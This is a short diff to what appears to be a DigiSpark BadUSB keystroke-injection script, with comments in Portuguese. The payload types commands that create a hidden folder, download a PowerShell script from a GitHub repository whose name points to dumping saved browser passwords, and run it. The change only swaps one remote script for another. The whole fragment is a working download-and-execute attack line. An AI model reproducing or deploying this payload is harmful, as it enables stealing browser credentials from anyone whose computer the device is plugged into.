@@ -24,5 +24,5 @@ STRING New-Item "$($env:LOCALAPPDATA)\DigiSparkDump" -Type Directory
 ENTER
 DELAY 2000
 REM  *** Realiza o Download do .ps1 e Executa o .ps1 ***
-STRING (new-object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/LeozinH1/DigiSpark-ChromePass/main/ChromeDump.ps1", "$($env:LOCALAPPDATA)\DigiSparkDump\ChromeDump.ps1"); powershell "$($env:LOCALAPPDATA)\DigiSparkDump\ChromeDump.ps1";
+STRING (new-object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/LeozinH1/BrowserDumpDigispark/main/script.ps1", "$($env:LOCALAPPDATA)\DigiSparkDump\script.ps1"); powershell "$($env:LOCALAPPDATA)\DigiSparkDump\script.ps1";
 ENTER
